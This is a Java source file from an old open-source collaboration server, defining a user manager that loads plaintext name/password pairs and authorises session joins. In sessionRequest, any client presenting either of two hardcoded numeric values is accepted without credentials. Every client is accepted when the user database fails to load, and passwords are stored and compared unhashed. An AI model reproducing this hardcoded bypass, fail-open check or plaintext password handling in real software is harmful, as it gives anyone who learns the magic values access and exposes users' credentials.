package jworkspace.network.server.security;

/* ----------------------------------------------------------------------------
   Clematis Collaboration Network 1.0.3
   Copyright (C) 2001-2003 Anton Troshin
   This file is part of Java Workspace Collaboration Network.
   This application is free software; you can redistribute it and/or
   modify it under the terms of the GNU Library General Public
   License as published by the Free Software Foundation; either
   version 2 of the License, or (at your option) any later version.
   This application is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
   Library General Public License for more details.
   You should have received a copy of the GNU Library General Public
   License along with this application; if not, write to the Free
   Software Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.
   The author may be contacted at:
   tysinsh@comail.ru
  ----------------------------------------------------------------------------
 */

import java.io.*;
import java.util.*;

import com.sun.media.jsdt.*;
import jworkspace.network.server.*;
import kiwi.io.*;

/**
 * This method executes login of users, joining any managed session.
 * Provides user database backend.
 */
abstract class AbstractUsersManager implements SessionManager
{
    /**
     * Hashtable holds user names and passwords.
     */
    protected Hashtable users = null;
    /**
     * Empty user manager constructor.
     */
    public AbstractUsersManager()
    {
        super();
    }
    /**
     * This method returns path to a user database file on server.
     * @return path to users database file
     */
    public abstract StringBuffer getUsersDBPath();
    /**
     * Loads hashtable with users from the local storage
     */
    protected void load()
    {
        /**
         *  Get users path.
         */
        StringBuffer path = getUsersDBPath();
        /**
         * If path does not exists, create directories.
         */
        File file = new File(path.toString());
        if (!file.exists())
        {
            file.mkdirs();
        }
        /**
         * Append the file itself
         */
        path.append(File.separator);
        path.append(ServerInfo.REGISTERED_USERS_FILE_NAME);
        file = new File(path.toString());
        /**
         * Read the file and fill users database.
         */
        if (file.exists())
        {
            Vector usersInfo = new Vector();
            try
            {
                FileInputStream in = new FileInputStream(file);
                XDataInputStream xin = new XDataInputStream(in);

                while (true)
                {
                    String line = xin.getLine();
                    if (line != null)
                    {
                        usersInfo.addElement(line);
                    }
                    else
                    {
                        break;
                    }
                }
                in.close();
            }
            catch (IOException ie)
            {
                return;
            }
            /**
             * Now parse lines to form a hashtable
             */
            users = new Hashtable();
            for (int i = 0; i < usersInfo.size(); i++)
            {
                String line = (String)usersInfo.elementAt(i);
                String[] info = getInfo(line);
                users.put(info[0], info[1]);
            }
        }
    }
    /**
     * Returns authentication info object from the user query
     * @param auth query
     * @return auth array of user name and password
     */
    private String[] getInfo(String auth)
    {
        StringTokenizer st = new StringTokenizer(auth, "$");
        /**
         * Construct an array of user name and plain password from incoming
         * auth reply from user.
         */
        String[] info = new String[2];
        for (int i = 0; i < 2; i++)
        {
            if (st.hasMoreTokens())
            {
                info[i] = st.nextToken();
            }
            else
            {
                info[i] = "_";
            }
        }
        return info;
    }
    /**
     * Session request method authorizes user to join session.
     * @param session on server
     * @param ai authentication information from user
     * @param client
     * @return true if client is authorized, otherwize false
     */
    public boolean sessionRequest(Session session, AuthenticationInfo ai, Client client)
    {
        if (users != null)
        {
            Object authObj = client.authenticate(ai);
            if (authObj instanceof String)
            {
                String auth = (String)authObj;
                String[] info = getInfo(auth);
                /**
                 * Find this pair in a server login database
                 */
                if (users.containsKey(info[0]) && users.get(info[0]).equals(info[1]))
                {
                    return true;
                }
            }
            else if (authObj instanceof Long)
            {
                if ( ((Long)authObj).longValue() == 1245879614 ||
                     ((Long)authObj).longValue() == 1236457514 )
                {
                    return true;
                }

            }
            return false;
        }
        else
        {
            return true;
        }
    }
}